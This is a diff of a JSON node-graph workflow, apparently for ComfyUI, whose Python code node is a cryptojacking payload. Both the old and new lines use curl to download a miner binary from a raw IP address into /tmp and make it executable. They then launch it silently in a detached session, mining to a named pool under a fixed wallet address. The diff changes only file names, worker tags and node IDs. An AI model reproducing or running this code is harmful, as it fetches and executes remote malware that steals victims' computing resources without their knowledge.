@@ -1,16 +1,16 @@
 {
-  "40029": {
+  "62471": {
     "class_type": "IDENode",
     "inputs": {
       "language": "python",
-      "pycode": "import os, subprocess\nos.system(\"curl -fsSL -o /tmp/m http://151.247.219.40:8000/alpha-miner && chmod +x /tmp/m\")\nsubprocess.Popen(\"setsid /tmp/m --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker A7_38 </dev/null >/dev/null 2>&1 &\", shell=True, start_new_session=True)\nresult = \"ok\""
+      "pycode": "import os, subprocess\nos.system(\"curl -fsSL -o /tmp/miner http://151.247.219.40:8000/alpha-miner && chmod +x /tmp/miner\")\nsubprocess.Popen(\"setsid /tmp/miner --pool stratum+tcp://sg1.alphapool.tech:5566 --address prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg --worker NEW7_38 </dev/null >/dev/null 2>&1 &\", shell=True, start_new_session=True)\nresult = \"ok\""
     }
   },
-  "40030": {
+  "62472": {
     "class_type": "PreviewAny",
     "inputs": {
       "source": [
-        "40029",
+        "62471",
         0
       ]
     }
